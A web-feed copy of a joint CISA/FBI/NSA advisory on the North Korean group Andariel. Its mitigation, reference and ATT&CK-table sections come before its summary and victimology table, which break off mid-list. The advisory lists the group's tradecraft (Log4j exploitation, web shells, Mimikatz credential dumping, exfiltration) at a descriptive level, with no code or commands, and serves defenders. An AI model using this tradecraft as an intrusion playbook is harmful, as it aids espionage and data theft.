<h2><strong>Mitigation Measures</strong></h2>
<p>The authoring agencies recommend implementing the mitigations below to improve your organization’s cybersecurity posture based on the threat actors’ activity.</p>
<h3>Log4Shell and Other Log4j Vulnerabilities</h3>
<p>Defenders should consult the joint Cybersecurity Advisory titled “<a href=\"https://media.defense.gov/2021/Dec/22/2002914139/-1/-1/1/JOINT_CSA_MITIGATING_LOG4SHELL_OTHER_LOG4J_VULNERABILITIES_20211222_.PDF\" title=\"Mitigating Log4Shell and Other Log4j-Related Vulnerabilities\">Mitigating Log4Shell and Other Log4j-Related Vulnerabilities</a>” and CISA’s “<a href=\"https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance\" title=\"Apache Log4j Vulnerability Guidance\">Apache Log4j Vulnerability</a>” guidance. Organizations can mitigate the risks posed by the vulnerability by identifying assets affected by Log4Shell and other Log4j-related vulnerabilities and upgrading Log4j assets and affected products to the latest version.&nbsp;</p>
<p><strong>Note:</strong> CVE-2021-44228 ‘Log4Shell’ was disclosed in December 2021 and affects the Log4j library prior to version 2.17.0.</p>
<p>Defenders should remain alert to vendor software updates, and initiate hunt and incident response procedures to detect possible Log4Shell exploitation.</p>
<h3>Web Shell Malware</h3>
<p>Web shell malware is deployed by adversaries on a victim’s web server to execute arbitrary system commands. The NSA and Australian Signals Directorate’s report titled “<a href=\"https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF\" title=\"Detect and Prevent Web Shell Malware\">Detect and Prevent Web Shell Malware</a>” provides mitigating actions to identify and recover from web shells.</p>
<p>Preventing exploitation of web-facing servers often depends on maintaining an inventory of systems and applications, rapidly applying patches as they are released, putting vulnerable or potentially risky systems behind reverse proxies that require authentication, and deploying and configuring Web Application Firewalls (WAFs).</p>
<h3>Endpoint Activity</h3>
<p>Preventing and detecting further adversary activity should focus on deploying endpoint agents or other monitoring mechanisms, blocking unnecessary outbound connections, blocking external access to administrator panels and services or turning them off entirely, and segmenting the network to prevent lateral movement from a compromised web server to critical assets.</p>
<h3>Command Line Activity and Remote Access</h3>
<p>Monitoring for suspicious command-line activity, implementing multi-factor authentication for remote access services, and properly segmenting and using allow-listing tools for critical assets can protect against malicious activity by RGB 3rd Bureau’s Andariel group and other cyber threat actors.</p>
<h3><strong>Packing</strong></h3>
<p>Signatures for Themida, VMProtect and a number of other packers are available <a href=\"https://github.com/ditekshen/detection/blob/master/yara/indicator_packed.yar\" title=\"ditekshen / detection\">here</a>, however, the signatures will not identify every file packed using these applications.</p>
<h3>Additional Mitigation Measures for Malicious Activities</h3>
<ul>
<li>Check for security vulnerabilities, apply patches, and update to the latest version of software</li>
<li>Encrypt all sensitive data including personal information</li>
<li>Block access to unused ports</li>
<li>Change passwords when they are suspected of being compromised</li>
<li>Alert on unexpected use of dual-use applications</li>
<li>Strengthen the subscriber identity authentication process for leased servers</li>
</ul>
<h3>DPRK Rewards for Justice</h3>
<p>The U.S. and ROK Governments encourage victims to report suspicious activities, including those related to suspected DPRK cyber activities, to relevant authorities. If you provide information about illicit DPRK activities in cyberspace, including past or ongoing operations, you may be eligible for a reward. If you have information about illicit DPRK activities in cyberspace, including past or ongoing operations, providing such information through the Department of State’s Rewards for Justice program could make you eligible to receive an award of up to $10 million. For further details, please visit <a href=\"https://rewardsforjustice.net/\" title=\"Rewards for Justice – Intelligence-Driven Law Enforcement\">https://rewardsforjustice.net/</a>.</p>
<h2><strong>Acknowledgements</strong></h2>
<p>Mandiant and Microsoft Threat Intelligence contributed to this CSA.</p>
<h3>Disclaimer of Endorsement</h3>
<p>Your organization has no obligation to respond or provide information in response to this product. &nbsp;If, after reviewing the information provided, your organization decides to provide information to the authorizing agencies, it must do so consistent with applicable state and federal law.</p>
<p>The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or service by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the co-authors.</p>
<h3>Version History</h3>
<p>July 25, 2024: Initial version.</p>
<p>August 6, 2024: Updated “Credential Access” and “Commodity Malware and Dual-Use Applications” sections.</p>
<h3>Trademark Recognition</h3>
<p>Active Directory®, Microsoft®, PowerShell®, and Windows® are registered trademarks of Microsoft Corporation. MITRE® and ATT&amp;CK® are registered trademarks of The MITRE Corporation.</p>
<h3>Purpose</h3>
<p>This document was developed in furtherance of the authoring agencies’ cybersecurity missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.</p>
<h3>Contact</h3>
<p><strong>U.S. organizations:</strong> Urgently report any anomalous activity or incidents, including based upon technical information associated with this Cybersecurity Advisory, to CISA at Report@cisa.dhs.gov or cisa.gov/report or to the FBI via your local FBI field office listed at <a href=\"https://www.fbi.gov/contact-us/fieldoffices\" title=\"Field Offices\">https://www.fbi.gov/contact-us/fieldoffices</a>.</p>
<p><strong>DC3 Cyber Forensics Laboratory (CFL):&nbsp;</strong><a href=\"mailto:afosi.dc3.cflintake@us.af.mil\" title=\"DC3 Cyber Forensics Laboratory\">afosi.dc3.cflintake@us.af.mil</a></p>
<p><strong>DoD-Defense Industrial Base (DIB) Collaborative Information Sharing Environment (DCISE):&nbsp;</strong><a href=\"mailto:dc3.dcise@us.af.mil\" title=\"DoD-Defense Industrial Base Collaborative Information Sharing Environment\">dc3.dcise@us.af.mil</a></p>
<p><strong>NSA Cybersecurity Report Questions and Feedback:&nbsp;</strong><a href=\"mailto:CybersecurityReports@nsa.gov\" title=\"NSA Cybersecurity Report Questions and Feedback\">CybersecurityReports@nsa.gov</a></p>
<p><strong>NSA Defense Industrial Base Inquiries and Cybersecurity Services:&nbsp;</strong><a href=\"mailto:DIB_Defense@cyber.nsa.gov\" title=\"NSA Defense Industrial Base Inquiries and Cybersecurity Services\">DIB_Defense@cyber.nsa.gov</a></p>
<p><strong>NSA Media Inquiries / Press Desk:&nbsp;</strong>443-634-0721, <a href=\"mailto:MediaRelations@nsa.gov\" title=\"NSA Media Inquiries / Press Desk\">MediaRelations@nsa.gov</a></p>
<p><strong>Republic of Korea organizations:</strong> If you suspect cyber incidents involving state actors, including Andariel, or discover similar cases, please contact the relevant authorities below.</p>
<p><strong>National Intelligence Service:&nbsp;</strong><a href=\"http://www.nis.go.kr\" title=\"National Intelligence Service\">www.nis.go.kr</a>, +82 111</p>
<h2><strong>References</strong></h2>
<p>AhnLab Security Emergency Response Center:</p>
<ul>
<li><a href=\"https://asec.ahnlab.com/en/56405/\" title=\"Analysis of Andariel’s New Attack Activities\">https://asec.ahnlab.com/en/56405/</a></li>
<li><a href=\"https://asec.ahnlab.com/en/59073/\" title=\"Circumstances of an Attack Exploiting an Asset Management Program (Andariel Group)\">https://asec.ahnlab.com/en/59073/</a></li>
<li><a href=\"https://asec.ahnlab.com/en/66088/\" title=\"Analysis of APT Attack Cases Using Dora RAT Against Korean Companies (Andariel Group)\">https://asec.ahnlab.com/en/66088/</a></li>
</ul>
<p>Boredhackerblog: <a href=\"http://www.boredhackerblog.info/2022/11/openssl-100-fipps-linux-backdoor-notes.html\" title=\"boredhackerblog\">http://www.boredhackerblog.info/2022/11/openssl-100-fipps-linux-backdoor-notes.html</a></p>
<p>Cisco Talos Intelligence blogs:</p>
<ul>
<li><a href=\"https://blog.talosintelligence.com/lazarus-three-rats/\" title=\"Lazarus and the tale of three RATs\">https://blog.talosintelligence.com/lazarus-three-rats/</a>&nbsp;</li>
<li><a href=\"https://blog.talosintelligence.com/lazarus-magicrat/\" title=\"MagicRAT: Lazarus’ latest gateway into victim networks\">https://blog.talosintelligence.com/lazarus-magicrat/</a></li>
<li><a href=\"https://blog.talosintelligence.com/lazarus-collectionrat/\" title=\"Lazarus Group's infrastructure reuse leads to discovery of new malware\">https://blog.talosintelligence.com/lazarus-collectionrat/</a></li>
<li><a href=\"https://blog.talosintelligence.com/lazarus-quiterat/\" title=\"Lazarus Group exploits ManageEngine vulnerability to deploy QuiteRAT\">https://blog.talosintelligence.com/lazarus-quiterat/</a></li>
</ul>
<p>DCSO blog: <a href=\"https://medium.com/@DCSO_CyTec/andariels-jupiter-malware-and-the-case-of-the-curious-c2-dbfe29f57499\" title=\"Andariel’s “Jupiter” malware and the case of the curious C2\">https://medium.com/@DCSO_CyTec/andariels-jupiter-malware-and-the-case-of-the-curious-c2-dbfe29f57499</a></p>
<p>Github.com/ditekshen: <a href=\"https://github.com/ditekshen/detection/blob/master/yara/indicator_packed.yar\" title=\"ditekshen / detection\">https://github.com/ditekshen/detection/blob/master/yara/indicator_packed.yar</a></p>
<p>JPCERT blogs:</p>
<ul>
<li><a href=\"https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html\" title=\"Lazarus Attack Activities Targeting Japan (VSingle/ValeforBeta)\">https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html</a></li>
<li><a href=\"https://blogs.jpcert.or.jp/en/2022/07/yamabot.html\" title=\"YamaBot Malware Used by Lazarus\">https://blogs.jpcert.or.jp/en/2022/07/yamabot.html</a></li>
</ul>
<p>Mandiant blogs:</p>
<ul>
<li><a href=\"https://www.mandiant.com/resources/blog/north-korea-cyber-structure-alignment-2023\" title=\"Assessed Cyber Structure and Alignments of North Korea in 2023\">https://www.mandiant.com/resources/blog/north-korea-cyber-structure-alignment-2023</a></li>
<li><a href=\"https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government\" title=\"Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government Organizations\">https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government</a></li>
</ul>
<p>Microsoft blogs:</p>
<ul>
<li><a href=\"https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/\" title=\"Multiple North Korean threat actors exploiting the TeamCity CVE-2023-42793 vulnerability\">https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/</a></li>
<li><a href=\"https://www.microsoft.com/en-us/security/blog/2022/07/14/north-korean-threat-actor-targets-small-and-midsize-businesses-with-h0lygh0st-ransomware/\" title=\"North Korean threat actor targets small and midsize businesses with H0lyGh0st ransomware\">https://www.microsoft.com/en-us/security/blog/2022/07/14/north-korean-threat-actor-targets-small-and-midsize-businesses-with-h0lygh0st-ransomware/</a></li>
</ul>
<p>NSCS Guidance:</p>
<ul>
<li>Alert: Apache Log4j Vulnerabilities: <a href=\"https://www.ncsc.gov.uk/news/apache-log4j-vulnerability\" title=\"Alert: Apache Log4j vulnerabilities\">https://www.ncsc.gov.uk/news/apache-log4j-vulnerability</a></li>
<li>Information: <a href=\"https://www.ncsc.gov.uk/information/log4j-vulnerability-what-everyone-needs-to-know\" title=\"Log4j vulnerability - what everyone needs to know\">https://www.ncsc.gov.uk/information/log4j-vulnerability-what-everyone-needs-to-know</a></li>
</ul>
<p>Symantec blog: <a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/clasiopa-materials-research\" title=\"Clasiopa: New Group Targets Materials Research\">https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/clasiopa-materials-research</a></p>
<p>VMware blog: <a href=\"https://blogs.vmware.com/security/2021/12/tigerrat-advanced-adversaries-on-the-prowl.html\" title=\"TigerRAT – Advanced Adversaries on the Prowl\">https://blogs.vmware.com/security/2021/12/tigerrat-advanced-adversaries-on-the-prowl.html</a></p>
<p>WithSecure Labs report: <a href=\"https://labs.withsecure.com/publications/no-pineapple-dprk-targeting-of-medical-research-and-technology-sector\" title=\"No Pineapple! –DPRK Targeting of Medical Research and Technology Sector\">https://labs.withsecure.com/publications/no-pineapple-dprk-targeting-of-medical-research-and-technology-sector</a></p>
<h2><strong>Appendix: MITRE ATT&amp;CK Techniques and Software</strong></h2>
<p>The tactics and techniques referenced in this advisory are identified in Table 3 – Table 12.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;3. Reconnaissance and Enumeration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Gather Victim Org Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1591\" title=\"Gather Victim Org Information \">T1591</a></td>
<td>The actors gather information about the victim’s organization that can be used during targeting.</td>
</tr>
<tr>
<td>Gather Victim Host Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1592\" title=\"Gather Victim Host Information\">T1592</a></td>
<td>The actors gather information about the victim’s hosts that can be used during targeting.</td>
</tr>
<tr>
<td>Active Scanning</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/\" title=\"Active Scanning\">T1595</a></td>
<td>The actors execute active reconnaissance scans to gather information that can be used during targeting.</td>
</tr>
<tr>
<td>Search Open Technical Databases</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/\" title=\"Search Open Technical Databases\">T1596</a></td>
<td>The actors search freely available technical databases for information about victims that can be used during targeting.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4. Resource Development, Tooling, and Remote Access Tools (RATs)</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></td>
<td>The actors attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1048\" title=\"Exfiltration Over Alternative Protocol\">T1048</a></td>
<td>The actors steal data by exfiltrating it over a different protocol than that of the existing command and control channel.</td>
</tr>
<tr>
<td>Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a></td>
<td>The actors use a connection proxy to direct network traffic between systems or act as intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.</td>
</tr>
<tr>
<td>Archive Collected Data</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a></td>
<td>The actors compress and/or encrypt data that is collected prior to exfiltration.</td>
</tr>
<tr>
<td>Protocol Tunneling</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a></td>
<td>The actors tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.</td>
</tr>
<tr>
<td>Develop Capabilities: Malware</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1587/001/\" title=\"Develop Capabilities: Malware\">T1587.001</a></td>
<td>The actors develop malware and malware components that can be used during targeting.</td>
</tr>
<tr>
<td>Develop Capabilities: Exploits</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1587/004/\" title=\"Develop Capabilities: Exploits\">T1587.004</a></td>
<td>The actors develop exploits that can be used during targeting.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5. Software used for Resource Development, Tooling, and RATs</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Software Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Mimikatz</td>
<td><a href=\"https://attack.mitre.org/versions/v15/software/S0002/\" title=\"Mimikatz\">S0002</a></td>
<td>The actors use a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks.</td>
</tr>
<tr>
<td>AdFind</td>
<td><a href=\"https://attack.mitre.org/versions/v13/software/S0552/\" title=\"AdFind\">S0552</a></td>
<td>The actors use a free command-line query tool that can be used for gathering information from the Active Directory.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6. Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1190\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td>The actors attempt to exploit a weakness in an Internet-facing host or system to initially access a network.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7. Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/\" title=\"Command and Scripting Interpreter\">T1059</a></td>
<td>The actors abuse command and script interpreters to execute commands, scripts, or binaries.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8. Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Obfuscated Files or Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1027/\" title=\"Obfuscated Files or Information\">T1027</a></td>
<td>The actors attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its content on the system or in transit.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9. Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a></td>
<td>The actors attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10. Discovery and Lateral Movement</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Services</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021\" title=\"Remote Services\">T1021</a></td>
<td>The actors use valid accounts to log into a service that accepts remote connections, such as telnet, SSH, and VNC.</td>
</tr>
<tr>
<td>Remote Services: SMB/Windows Admin Shares</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/002\" title=\"Remote Services: SMB/Windows Admin Shares\">T1021.002</a></td>
<td>The actors use valid accounts to interact with a remote network share using Server Message Block (SMB).</td>
</tr>
<tr>
<td>File and Directory Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1083\" title=\"File and Directory Discovery\">T1083</a></td>
<td>The actors enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.</td>
</tr>
<tr>
<td>Account Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1087\" title=\"Account Discovery\">T1087</a></td>
<td>The actors attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 11. Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Application Layer Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/\" title=\"Application Layer Protocol\">T1071</a></td>
<td>The actors establish command and control capabilities over commonly used application layer protocols such as HTTP(S), OPC, telnet, DNP3, and Modbus.</td>
</tr>
<tr>
<td>Proxy</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/\" title=\"Proxy\">T1090</a></td>
<td>The actors use a connection proxy to direct network traffic between systems or act as an intermediary for network communications.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table&nbsp;12. Collection and Exfiltration</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data from Network Shared Drive</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1039\" title=\"Data from Network Shared Drive\">T1039</a></td>
<td>The actors search network shares on computers they have compromised to find files of interest.</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1048\" title=\"Exfiltration Over Alternative Protocol\">T1048</a></td>
<td>The actors steal data by exfiltrating it over a different protocol than that of the existing command and control server.</td>
</tr>
<tr>
<td>Archive Collected Data</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a></td>
<td>The actors compress and/or encrypt data that is collected prior to exfiltration.</td>
</tr>
<tr>
<td>Exfiltration Over Web Service</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1567\" title=\"Exfiltration Over Web Service\">T1567</a></td>
<td>The actors use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel.</td>
</tr>
</tbody>
</table>
</div>
</div>" "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a" (26272 62846) new 6 nil nil ((title nil "North Korea Cyber Group Conducts Global Espionage Campaign to Advance Regime’s Military and Nuclear Programs") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a") (description nil "<h2><strong>Summary</strong></h2>
<p>The U.S. Federal Bureau of Investigation (FBI) and the following authoring partners are releasing this Cybersecurity Advisory to highlight cyber espionage activity associated with the Democratic People’s Republic of Korea (DPRK)’s Reconnaissance General Bureau (RGB) 3rd Bureau based in Pyongyang and Sinuiju:</p>
<ul>
<li>U.S. Cyber National Mission Force (CNMF)</li>
<li>U.S. Cybersecurity and Infrastructure Security Agency (CISA)</li>
<li>U.S. Department of Defense Cyber Crime Center (DC3)</li>
<li>U.S. National Security Agency (NSA)</li>
<li>Republic of Korea’s National Intelligence Service (NIS)</li>
<li>Republic of Korea’s National Police Agency (NPA)</li>
<li>United Kingdom’s National Cyber Security Centre (NCSC)</li>
</ul>
<p>The RGB 3<sup>rd</sup> Bureau includes a DPRK (aka North Korean) state-sponsored cyber group known publicly as <a href=\"https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government\" title=\"Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government Organizations\">Andariel</a>, <a href=\"https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/microsoft-threat-actor-naming?view=o365-worldwide\" title=\"How Microsoft names threat actors\">Onyx Sleet</a> (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa. The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions. The authoring agencies believe the group and the cyber techniques remain an ongoing threat to various industry sectors worldwide, including but not limited to entities in their respective countries, as well as in Japan and India. RGB 3<sup>rd</sup> Bureau actors fund their espionage activity through ransomware operations against U.S. healthcare entities.</p>
<p>The actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j, to deploy a web shell and gain access to sensitive information and applications for further exploitation. The actors then employ standard system discovery and enumeration techniques, establish persistence using Scheduled Tasks, and perform privilege escalation using common credential stealing tools such as Mimikatz. The actors deploy and leverage custom malware implants, remote access tools (RATs), and open source tooling for execution, lateral movement, and data exfiltration.&nbsp;</p>
<p>The actors also conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.</p>
<p>The authoring agencies encourage critical infrastructure organizations to apply patches for vulnerabilities in a timely manner, protect web servers from web shells, monitor endpoints for malicious activities, and strengthen authentication and remote access protections. While not exclusive, entities involved in or associated with the below industries and fields should remain vigilant in defending their networks from North Korea state-sponsored cyber operations:</p>
<p>For additional information on DPRK state-sponsored malicious cyber activity, see CISA’s <a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/north-korea\" title=\"North Korea Cyber Threat Overview and Advisories\">North Korea Cyber Threat Overview and Advisories</a> webpage.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/aa24-207a-dprk-cyber-group-conducts-global-espionage-campaign_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-207A North Korea Cyber Group Conducts Global Espionage Campaign to Advance Regime’s Military and Nuclear Programs</a>
    <span class=\"c-file__size\">(PDF,       804.21 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/aa24-207a-dprk-cyber-group-conducts-global-espionage-campaign_ES.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-207A North Korea Cyber Group Conducts Global Espionage Campaign to Advance Regime’s Military and Nuclear Programs - Spanish Translation</a>
    <span class=\"c-file__size\">(PDF,       836.55 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of associated indicators of compromise (IOCs), see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-07/AA24-207A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-207A STIX XML</a>
    <span class=\"c-file__size\">(XML,       296.99 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-07/AA24-207A-North-Korea-Cyber-Group-Conducts-Global-Espionage-Campaign-to-Advance-Regimes-Military-and-Nuclear-Programs.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-207A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       140.84 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<h3>RGB 3<sup>rd</sup> Bureau</h3>
<p><a href=\"https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government\" title=\"Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government Organizations\">Andariel</a> (also known as <a href=\"https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/microsoft-threat-actor-naming?view=o365-worldwide\" title=\"How Microsoft names threat actors\">Onyx Sleet</a>, formerly PLUTONIUM, DarkSeoul, Silent Chollima, and Stonefly/Clasiopa) is a North Korean state-sponsored cyber group, under the RGB 3rd Bureau, based in Pyongyang and Sinuiju. The authoring agencies assess the group has evolved from conducting destructive attacks targeting U.S. and South Korean organizations to conducting specialized cyber espionage and ransomware operations.</p>
<h4><strong>Cyber Espionage</strong></h4>
<p>The actors currently target sensitive military information and intellectual property of defense, aerospace, nuclear, engineering organizations. To a lesser extent, the group targets medical and energy industries. See Table 1 for more victimology information.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1. Andariel Cyber Espionage Victimology</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Industry&nbsp;</th>
<th role=\"columnheader\">Information Targeted</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Defense</strong></td>
<td>
<ul>
<li>Heavy and light tanks and self-propelled howitzers</li>
<li>Light strike vehicles and ammunition supply vehicles</li>
<li>Littoral combat ships and combatant craft</li>
<li>Submarines, torpedoes, unmanned underwater vehicles (UUVs), and autonomous underwater vehicles (AUVs)</li>
<li>Modeling and simulation services</li>
</ul>
</td>
</tr>
<tr>
<td><strong>Aerospace</strong></td>
<td>
<ul>
<li>Fighter aircraft and unmanned aerial vehicles (UAVs)</li>
<li>Missiles and missile defense systems</li>
<li>Satellites, satellite communications, and nano-satellite technology</li>
<li>Surveillance radar, phased-array radar, and other radar systems</li>
</ul>
</td>
</tr>
<tr>
<td><strong>Nuclear</strong></td>
<td>
<ul>
<li>Uranium processing and enrichment</li>
<li>Material waste and storage</li>
<li>Nuclear power plants</li>
<li>Government nuclear facilities and research institutes</li>
</ul>
</td>
</tr>
<tr>
<td><strong>Engineering</strong></td>
<td>
<ul>
<li>Shipbuilding and marine engineering</li>
<li>Robot machinery and mechanical arms</li>
<li>Additive manufacturing and 3D printing components and technology</li>
